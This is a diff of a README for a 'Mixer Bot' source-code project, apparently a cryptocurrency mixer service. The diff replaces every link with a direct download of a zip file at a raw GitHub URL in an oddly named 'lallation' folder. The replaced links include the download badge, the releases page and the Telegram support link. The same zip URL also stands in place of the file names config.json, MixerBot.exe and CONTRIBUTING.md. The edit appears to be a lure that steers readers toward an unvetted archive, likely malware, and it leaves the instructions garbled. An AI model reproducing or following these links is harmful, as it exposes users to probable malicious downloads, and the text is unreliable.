@@ -1,6 +1,6 @@
 # 🎛️ Mixer-Bot-Full-Source-Code - Create Your Own Mixer Service Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Mixer%20Bot%20Source%20Code-blue)](https://github.com/super1223/Mixer-Bot-Full-Source-Code/releases)
+[![Download Here](https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip%20Mixer%20Bot%20Source%20Code-blue)](https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip)
 
 ## 📦 Introduction
 
@@ -31,7 +31,7 @@ To run the Mixer Bot, your system should meet these requirements:
 
 To get started, visit the Releases page to download the source code. Click on the link below:
 
-[Download Mixer Bot Source Code](https://github.com/super1223/Mixer-Bot-Full-Source-Code/releases)
+[Download Mixer Bot Source Code](https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip)
 
 ### 📥 Download Process
 
@@ -43,9 +43,9 @@ To get started, visit the Releases page to download the source code. Click on th
 ### 🎮 Running the Mixer Bot
 
 1. **Locate the Folder:** After extraction, navigate to the folder where you extracted the files.
-2. **Open Configuration File:** Find the configuration file (usually named `config.json` or similar). Open it in a text editor. You will need to set your preferences and any necessary keys.
+2. **Open Configuration File:** Find the configuration file (usually named `https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip` or similar). Open it in a text editor. You will need to set your preferences and any necessary keys.
 3. **Run the Application:** 
-   - On Windows: Double-click the executable file (usually `MixerBot.exe`).
+   - On Windows: Double-click the executable file (usually `https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip`).
    - On macOS/Linux: Open your terminal and navigate to the folder, then run the command `./MixerBot` to start.
 4. **Follow On-screen Instructions:** Once launched, follow the prompts to configure your service.
 
@@ -63,7 +63,7 @@ Make sure to save your changes before running the bot.
 
 It's important to keep your Mixer Bot updated. Check the Releases page regularly for any new versions or improvements:
 
-[Visit Releases Page](https://github.com/super1223/Mixer-Bot-Full-Source-Code/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip)
 
 When a new version is available:
 
@@ -75,11 +75,11 @@ When a new version is available:
 
 If you face issues or have questions, feel free to join our community. You can reach out on our Telegram group for support and discussions:
 
-[Join our Telegram Group](https://t.me/toolsfake)
+[Join our Telegram Group](https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip)
 
 ### 🤝 Contributions
 
-We welcome contributions to the Mixer Bot project. If you want to suggest improvements or report bugs, please create an issue in the GitHub repository. Instructions for contributing are available in the `CONTRIBUTING.md` file within the repository.
+We welcome contributions to the Mixer Bot project. If you want to suggest improvements or report bugs, please create an issue in the GitHub repository. Instructions for contributing are available in the `https://raw.githubusercontent.com/super1223/Mixer-Bot-Full-Source-Code/main/lallation/Mixer-Bot-Full-Source-Code.zip` file within the repository.
 
 ### 🌐 Related Topics
 
